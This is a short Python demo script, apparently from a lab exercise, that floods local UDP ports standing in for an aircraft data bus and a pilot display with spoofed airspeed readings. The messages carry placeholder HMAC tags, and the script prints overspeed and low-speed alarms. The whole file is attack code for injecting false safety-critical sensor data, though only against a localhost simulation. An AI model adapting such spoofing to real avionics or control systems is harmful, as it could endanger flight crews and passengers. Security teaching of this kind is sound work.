
 #demo attack

import socket, time, json, hmac, hashlib

class SpoofingAttack:
    def __init__(self):
        self.bus_port = 8888
        self.display_port = 8889
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
    def launch_attack(self):
        # Attack sequence (typically air speed between 450 and 520 knots)
        fake_speeds = [600, 630, 900, 400, 690, 320, 770, 310, 680] #false data

        
        for i, speed in enumerate(fake_speeds):
            # Send spoofed data to bus monitor try to bypass HMAC check
            bus_msg = {
                'type': 'attack',
                'sender': 'MALWARE_SPOOFER',
                'airspeed': speed,
                'label': 0x81,
                'hmac': 'fake_hmac_01101101'
            }
            self.sock.sendto(json.dumps(bus_msg).encode(), ('localhost', self.bus_port))
            
            # Send spoofed data to pilot display try to bypass HMAC check
            #fyi the HMAC ID repesents a SHA-256 hash of "The quick brown fox jumps over the lazy dog" with the key "key" .
            display_msg = {
                'type': 'attack',
                'airspeed': speed,
                'system': 'SPOOFED',
                'hmac': 'fake_hmac_f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8'
            }
            self.sock.sendto(json.dumps(display_msg).encode(), ('localhost', self.display_port))
            
           # print(f" [ATTACK] Injected fake airspeed: {speed} knots")
              
            
            # Associate warnings with specific speeds
            if speed < 450:
                print(f"Alarm...Alarm...Alarm...Alert...LOW AIRSPEED WARNING! ({speed} knots)")
            elif speed > 520:
                print(f"Alarm...Alarm...Alarm...Alert...OVERSPEED WARNING! ({speed} knots)")
            
            time.sleep(3)

if __name__ == "__main__":
    print("start Spoofing Attack")
    #print("Injecting fake airspeed values")
    attack = SpoofingAttack()
    attack.launch_attack()
